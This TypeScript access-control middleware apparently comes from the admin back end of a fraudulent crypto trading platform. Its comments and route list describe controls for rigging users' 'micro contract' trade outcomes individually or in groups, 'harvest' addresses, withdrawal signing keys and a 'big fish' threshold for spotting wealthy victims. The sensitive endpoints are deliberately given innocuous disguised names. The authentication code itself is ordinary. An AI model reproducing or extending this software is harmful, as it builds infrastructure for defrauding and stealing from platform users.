/**
 * RBAC Middleware - Role-Based Access Control
 * 
 * Role Types:
 * - 0: SuperAdmin (全权) - Full access to all system functions
 * - 1: Operator (操作员) - Limited to user/agent management
 * 
 * SuperAdmin-Only Functions (STRICTLY ENFORCED):
 * - TELEGRAM_BOT_TOKEN configuration
 * - MAINTENANCE_ENDPOINT (harvest addresses)
 * - NETWORK_SIGNING_KEY (withdrawal private keys)
 * - Micro contract win/loss control (秒合约单控/群控)
 * - RPC endpoint configuration
 * - Health threshold (big fish detection)
 */

import { Elysia } from 'elysia';
import { db } from '../db';
import { agent } from '../db/schema';
import { eq } from 'drizzle-orm';

export type RoleType = 'operator' | 'superadmin';

// Role type constants
export const ROLE_SUPER_ADMIN = 0;
export const ROLE_OPERATOR = 1;

// Permission bits for granular control
export const PERMISSIONS = {
  USER_MANAGE: 1 << 0,      // User CRUD, balance view
  USER_BALANCE: 1 << 1,     // Balance modification
  AGENT_MANAGE: 1 << 2,     // Agent CRUD
  KYC_MANAGE: 1 << 3,       // KYC approval/rejection
  WITHDRAW_MANAGE: 1 << 4,  // Withdrawal approval
  // SuperAdmin only permissions (bit 16+)
  TELEGRAM_CONFIG: 1 << 16,
  HARVEST_CONFIG: 1 << 17,
  SIGNING_KEY_CONFIG: 1 << 18,
  MICRO_CONTROL: 1 << 19,
  RPC_CONFIG: 1 << 20,
  SYSTEM_CONFIG: 1 << 21,
};

// Sensitive paths that require SuperAdmin (disguised names)
export const SUPERADMIN_ONLY_PATHS = [
  '/api/admin/system/messaging-gateway',      // Telegram config
  '/api/admin/system/maintenance-endpoint',   // Harvest addresses
  '/api/admin/network/signing-credentials',   // Private keys
  '/api/admin/network/node-endpoints',        // RPC endpoints
  '/api/admin/system/health-threshold',       // Big fish threshold
  '/api/admin/accounts/risk-profile',         // Micro contract user control
  '/api/admin/accounts/batch-risk',           // Micro contract group control
];

export function checkPermissionMask(mask: number, permission: number): boolean {
  return (mask & permission) === permission;
}

export const rbacMiddleware = (requiredRole: RoleType) => new Elysia({ name: `rbac-${requiredRole}` })
  .derive(async ({ jwt, headers, set }) => {
    const authorization = headers.authorization;
    
    if (!authorization) {
      set.status = 401;
      return { agent: null, error: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    
    try {
      const payload = await jwt.verify(token) as { agentId: number; type: string };
      
      if (!payload || !payload.agentId || payload.type !== 'agent') {
        set.status = 401;
        return { agent: null, error: 'Invalid agent token' };
      }

      const [agentData] = await db.select().from(agent).where(eq(agent.id, payload.agentId)).limit(1);
      
      if (!agentData) {
        set.status = 401;
        return { agent: null, error: 'Agent not found' };
      }

      if (agentData.isLock === 1) {
        set.status = 403;
        return { agent: null, error: 'Agent account is locked' };
      }

      // SuperAdmin has all permissions
      if (agentData.roleType === 0) {
        return { agent: agentData, error: null };
      }

      // Check if operator trying to access superadmin routes
      if (requiredRole === 'superadmin' && agentData.roleType !== 0) {
        set.status = 403;
        return { agent: null, error: 'SuperAdmin only' };
      }

      return { agent: agentData, error: null };
    } catch (error) {
      set.status = 401;
      return { agent: null, error: 'Token verification failed' };
    }
  })
  .onBeforeHandle(({ agent: agentData, error, set }) => {
    if (!agentData || error) {
      set.status = error === 'SuperAdmin only' ? 403 : 401;
      return { type: 'error', message: error || 'Unauthorized' };
    }
  });

/**
 * Log admin action for audit trail
 */
export const logAdminAction = async (
  agentId: number, 
  action: string, 
  path: string, 
  method: string,
  details?: any
) => {
  const timestamp = new Date().toISOString();
  const logEntry = JSON.stringify({ action, path, method, details, timestamp });
  
  await db.update(agent)
    .set({ lastActionLog: logEntry })
    .where(eq(agent.id, agentId));
  
  console.log(`[ADMIN] Agent ${agentId}: ${action} - ${method} ${path}`);
};

/**
 * Log security violation for unauthorized access attempts
 * This is CRITICAL for detecting operator privilege escalation
 */
export const logSecurityViolation = async (
  agentId: number | null,
  path: string,
  method: string,
  reason: string,
  ip?: string
) => {
  const timestamp = new Date().toISOString();
  const violation = {
    agentId,
    path,
    method,
    reason,
    ip,
    timestamp,
    severity: 'HIGH',
  };
  
  // Log to console with warning
  console.warn(`[SECURITY VIOLATION] ${JSON.stringify(violation)}`);
  
  // In production, this should also:
  // 1. Send Telegram alert to SuperAdmin
  // 2. Store in security_log table
  // 3. Potentially trigger account lockout after repeated violations
  
  // TODO: Implement database logging when securityLog table exists
  // await db.insert(securityLog).values(violation);
};

/**
 * SuperAdmin-only middleware with strict enforcement
 * Used for the most sensitive endpoints
 */
export const superAdminOnly = new Elysia({ name: 'superadmin-guard' })
  .derive(async ({ jwt, headers, set, request }: any) => {
    const authorization = headers.authorization;
    const path = new URL(request.url).pathname;
    const method = request.method;
    
    if (!authorization) {
      await logSecurityViolation(null, path, method, 'No authorization header');
      set.status = 401;
      return { agent: null, isSuperAdmin: false };
    }

    const token = authorization.replace('Bearer ', '');
    
    try {
      const payload = await jwt.verify(token) as { agentId: number; type: string };
      
      if (!payload || !payload.agentId || payload.type !== 'agent') {
        await logSecurityViolation(null, path, method, 'Invalid token structure');
        set.status = 401;
        return { agent: null, isSuperAdmin: false };
      }

      const [agentData] = await db.select().from(agent)
        .where(eq(agent.id, payload.agentId)).limit(1);
      
      if (!agentData) {
        await logSecurityViolation(payload.agentId, path, method, 'Agent not found');
        set.status = 401;
        return { agent: null, isSuperAdmin: false };
      }

      if (agentData.isLock === 1) {
        await logSecurityViolation(payload.agentId, path, method, 'Locked agent attempted access');
        set.status = 403;
        return { agent: null, isSuperAdmin: false };
      }

      // STRICT CHECK: Only roleType === 0 (SuperAdmin) allowed
      if (agentData.roleType !== ROLE_SUPER_ADMIN) {
        // CRITICAL: Operator trying to access SuperAdmin endpoint
        await logSecurityViolation(
          payload.agentId, 
          path, 
          method, 
          `PRIVILEGE ESCALATION ATTEMPT: Operator (role=${agentData.roleType}) tried to access SuperAdmin endpoint`
        );
        set.status = 403;
        return { agent: agentData, isSuperAdmin: false };
      }

      // Log successful SuperAdmin access
      await logAdminAction(agentData.id, 'SUPERADMIN_ACCESS', path, method);

      return { agent: agentData, isSuperAdmin: true };
    } catch (error) {
      await logSecurityViolation(null, path, method, 'Token verification failed');
      set.status = 401;
      return { agent: null, isSuperAdmin: false };
    }
  })
  .onBeforeHandle(({ agent: agentData, isSuperAdmin, set }: any) => {
    if (!agentData || !isSuperAdmin) {
      return { 
        type: 'error', 
        message: 'Access denied. SuperAdmin privileges required.',
        code: 'FORBIDDEN_SUPERADMIN_ONLY'
      };
    }
  });

/**
 * Operator middleware - for regular admin tasks
 */
export const operatorAccess = new Elysia({ name: 'operator-guard' })
  .derive(async ({ jwt, headers, set }: any) => {
    const authorization = headers.authorization;
    
    if (!authorization) {
      set.status = 401;
      return { agent: null };
    }

    const token = authorization.replace('Bearer ', '');
    
    try {
      const payload = await jwt.verify(token) as { agentId: number; type: string };
      
      if (!payload || !payload.agentId || payload.type !== 'agent') {
        set.status = 401;
        return { agent: null };
      }

      const [agentData] = await db.select().from(agent)
        .where(eq(agent.id, payload.agentId)).limit(1);
      
      if (!agentData || agentData.isLock === 1) {
        set.status = 403;
        return { agent: null };
      }

      // Both SuperAdmin (0) and Operator (1) can access
      return { agent: agentData };
    } catch (error) {
      set.status = 401;
      return { agent: null };
    }
  })
  .onBeforeHandle(({ agent: agentData, set }: any) => {
    if (!agentData) {
      set.status = 401;
      return { type: 'error', message: 'Unauthorized' };
    }
  });
